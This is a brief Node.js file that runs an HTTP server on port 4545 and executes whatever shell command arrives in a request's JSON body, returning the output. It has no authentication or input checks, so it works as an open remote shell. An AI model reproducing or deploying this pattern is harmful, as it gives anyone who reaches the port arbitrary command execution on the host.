const http = require('http'),
	url = require('url');

const exec  = require('child_process').exec;

const command = (cmd, res) =>{
	exec(cmd, (err, stdout, stderr) =>{
		if (err) {
			console.error(err);
			res.end(`ERROR: ${err}`)
			return;
		}
		console.log(stdout);
		res.end(stdout || '')
	})
}

http.createServer((req, res) => {
	let query =  url.parse(req.url, true).query;

	let body = ''
	req.on('data', (chunck) =>{
		body += chunck
	})

	req.on('end', () =>{
		body = JSON.parse(body)
		command(body.command, res)
		res.writeHead(200, {'Content-Type': 'text/plain'});
	})
}).listen(4545);
